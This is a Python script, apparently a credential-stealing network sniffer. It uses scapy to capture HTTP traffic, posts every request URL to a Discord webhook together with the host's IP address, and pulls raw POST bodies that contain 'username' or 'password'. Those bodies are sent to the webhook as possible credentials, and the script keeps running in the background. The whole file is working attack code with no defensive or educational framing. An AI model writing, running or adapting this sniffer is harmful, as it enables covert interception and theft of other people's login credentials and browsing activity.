import scapy.all as scapy
from scapy.layers.http import HTTPRequest, HTTPResponse  # Import HTTP packet
import requests
from threading import Thread
import os
import signal
import time
import socket
import psutil

# Discord webhook URL
WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'
# Süre (saniye) boyunca arka planda çalışacak
BACKGROUND_DURATION = 600

HTTP_METHODS = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'PROPFIND']

def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def send_to_discord(content):
    ip_address = get_ip_address()
    data = {
        "content": f"logger by {ip_address} - {content}"
    }
    response = requests.post(WEBHOOK_URL, json=data)
    if response.status_code != 204:
        print(f"Failed to send message to Discord: {response.status_code}, {response.text}")

def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        http_layer = packet.getlayer(HTTPRequest)
        method = http_layer.Method.decode()
        host = http_layer.Host.decode()
        path = http_layer.Path.decode()
        url = f"http://{host}{path}"

        if method in HTTP_METHODS:
            send_to_discord(f"HTTP Request Detected: {method} {url}")
            print(f"Sent to Discord: {method} {url}")

        if method == 'POST':
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load.decode(errors='ignore')
                if 'username' in load or 'password' in load:
                    send_to_discord(f"Possible Credentials Found: {load}")
                    print(f"Sent to Discord: Possible Credentials Found: {load}")

def sniff_packets():
    scapy.sniff(filter="tcp port 80 or tcp port 443", prn=process_packet, store=False)

def start_sniffer():
    thread = Thread(target=sniff_packets)
    thread.daemon = True
    thread.start()

def run_in_background(duration):
    start_sniffer()
    time.sleep(duration)

if __name__ == "__main__":
    start_sniffer()
    background_thread = Thread(target=run_in_background, args=(BACKGROUND_DURATION,))
    background_thread.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Stopping the sniffer...")
        os.kill(os.getpid(), signal.SIGINT)
